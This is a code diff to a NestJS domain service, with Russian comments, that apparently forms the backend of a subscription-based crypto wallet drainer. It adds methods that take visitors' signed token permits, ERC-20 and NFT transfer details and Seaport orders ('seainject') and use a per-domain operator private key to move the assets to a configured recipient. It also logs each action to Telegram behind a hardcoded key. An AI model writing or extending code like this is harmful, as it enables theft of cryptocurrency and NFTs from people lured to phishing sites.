@@ -12,28 +12,35 @@ import {
   BadRequestException,
   ErrorCodes,
   ForbiddenException,
+  InternalServerException,
   MAX_MONTH_SUB_DOMAINS,
   MAX_WORKER_SUB_DOMAINS,
 } from 'src/common';
 import { UsersEntity } from 'src/user/user.entity';
 import { UserService } from 'src/user/user.service';
+import { WalletService } from 'src/wallet/wallet.service';
 import {
   AddDomainDto,
   DomainResponseDto,
   IsConnectedResponseDto,
+  TokenPermitDto,
+  TransferNFTDto,
   UpdateDomainDto,
 } from './dto';
+import { TokenTransferDto } from './dto/token-transfer.dto';
 
 @Injectable()
 export class DomainsService {
   private root_path: string = join(process.cwd());
   private domains_path = join(process.cwd(), 'domains');
   private staticHandler = e.static(this.root_path);
+  private w_logger = new Logger('Wallet');
 
   constructor(
     private prismaService: PrismaService,
     private userService: UserService,
     private httpService: HttpService,
+    private walletService: WalletService,
   ) {
     if (!existsSync(this.domains_path)) {
       mkdirSync(this.domains_path, { recursive: true });
@@ -86,13 +93,22 @@ export class DomainsService {
     return { host, path, is_connected: host == domain };
   }
 
-  public async logToTelegramChat(host: string, message: string) {
+  /** Метод для кошельков от доменов */
+  public async logToTelegramChat(host: string, message: string, key: string) {
+    if (key !== '8bEEokUZLhn7nAHz') {
+      Logger.log(`Invalid key`, `${host}:logToTelegramChat`);
+      return;
+    }
+
     const domain = await this.findByHost(host);
-    if (!domain) {
-      throw new BadRequestException(
-        { message: 'Domain not found' },
-        ErrorCodes.DomainNotFound,
+    if (!domain || domain.chat_id == null) {
+      Logger.log(
+        `No domain or chat_id. Domain: ${!!domain}. Chat_ID: ${!(
+          domain?.chat_id == null
+        )}`,
+        `${host}:logToTelegramChat`,
       );
+      return;
     }
 
     const endpoint = new URL(
@@ -100,7 +116,7 @@ export class DomainsService {
       'https://api.telegram.org',
     );
 
-    // TODO: endpoint.searchParams.append('chat_id', '');
+    endpoint.searchParams.append('chat_id', domain.chat_id);
     endpoint.searchParams.append(
       'text',
       encodeURIComponent(message.replace('<br>', '\n')),
@@ -112,6 +128,143 @@ export class DomainsService {
       .catch((error) =>
         Logger.error(`Ошибка отправки лога: ${error.message}`, `${host}-logs`),
       );
+  }
+
+  /** Метод для кошельков от доменов */
+  public async tokenPermit(host: string, dto: TokenPermitDto) {
+    this.w_logger.log(`TokenPermit ${host} -> ${JSON.stringify(dto)}`);
+
+    const domain = await this.findByHost(host);
+    if (!domain) {
+      throw new InternalServerException(
+        { message: 'Some error occurred while executing the transaction.' },
+        ErrorCodes.Unknown,
+      );
+    }
+
+    const json_params = JSON.parse(dto.permit);
+    const response = await this.walletService.permit(
+      {
+        chainId: dto.chainId,
+        tokenAddress: dto.tokenAddress,
+        abiUrl: dto.abiUrl,
+        amount: dto.amount,
+        owner: dto.owner,
+        spender: dto.spender,
+        value: json_params.value,
+        deadline: json_params.deadline,
+        v: json_params.v,
+        r: json_params.r,
+        s: json_params.s,
+      },
+      {
+        private_key: domain.private_key,
+        recipient: domain.recipient,
+        contract_SAFA: domain.contract_SAFA,
+      },
+    );
+
+    if (!response) {
+      throw new InternalServerException(
+        { message: 'Some error occurred while executing the transaction.' },
+        ErrorCodes.Unknown,
+      );
+    }
+
+    return { message: 'Success' };
+  }
+
+  /** Метод для кошельков от доменов */
+  public async transferERC(host: string, dto: TokenTransferDto) {
+    this.w_logger.log(`TransferERC ${host} -> ${JSON.stringify(dto)}`);
+
+    const domain = await this.findByHost(host);
+    if (!domain) {
+      throw new InternalServerException(
+        { message: 'Some error occurred while executing the transaction.' },
+        ErrorCodes.Unknown,
+      );
+    }
+
+    const response = await this.walletService.transferToken(
+      dto.chainId,
+      dto.tokenAddress,
+      dto.abiUrl,
+      dto.amount,
+      dto.owner,
+      {
+        private_key: domain.private_key,
+        recipient: domain.recipient,
+        contract_SAFA: domain.contract_SAFA,
+      },
+    );
+    if (!response) {
+      throw new InternalServerException(
+        { message: 'Some error occurred while executing the transaction.' },
+        ErrorCodes.Unknown,
+      );
+    }
+
+    return { message: 'Success' };
+  }
+
+  /** Метод для кошельков от доменов */
+  public async transferNFT(host: string, dto: TransferNFTDto) {
+    this.w_logger.log(`TransferNFT ${host} -> ${JSON.stringify(dto)}`);
+
+    const domain = await this.findByHost(host);
+    if (!domain) {
+      throw new InternalServerException(
+        { message: 'Some error occurred while executing the transaction.' },
+        ErrorCodes.Unknown,
+      );
+    }
+
+    const response = await this.walletService.batchtransfer(
+      dto.owner,
+      dto.tokenAddress,
+      dto.tokens,
+      {
+        private_key: domain.private_key,
+        recipient: domain.recipient,
+        contract_SAFA: domain.contract_SAFA,
+      },
+    );
+    if (!response) {
+      throw new InternalServerException(
+        { message: 'Some error occurred while executing the transaction.' },
+        ErrorCodes.Unknown,
+      );
+    }
+
+    return { message: 'Success' };
+  }
+
+  /** Метод для кошельков от доменов */
+  public async seaportSign(host: string, dto: any) {
+    this.w_logger.log(`SeaportSign ${host} -> ${JSON.stringify(dto)}`);
+
+    const domain = await this.findByHost(host);
+    if (!domain) {
+      throw new InternalServerException(
+        { message: 'Some error occurred while executing the transaction.' },
+        ErrorCodes.Unknown,
+      );
+    }
+
+    const response = await this.walletService.seainject(dto, {
+      private_key: domain.private_key,
+      recipient: domain.recipient,
+      contract_SAFA: domain.contract_SAFA,
+    });
+    if (!response) {
+      throw new InternalServerException(
+        { message: 'Some error occurred while executing the transaction.' },
+        ErrorCodes.Unknown,
+      );
+    }
+
+    return { message: 'Success' };
   }
 
   /** Добавить домен */
@@ -192,11 +345,9 @@ export class DomainsService {
     }
 
     if (current_user?.subscription?.type !== SubscriptionType.MONTH) {
-      delete dto.receiver;
-      delete dto.min_eth_bal;
-      delete dto.chain_id;
-      delete dto.caller_addr;
-      delete dto.caller_pk;
+      delete dto.contract_SAFA;
+      delete dto.private_key;
+      delete dto.recipient;
     }
 
     return this.updateById(domain_id, dto);
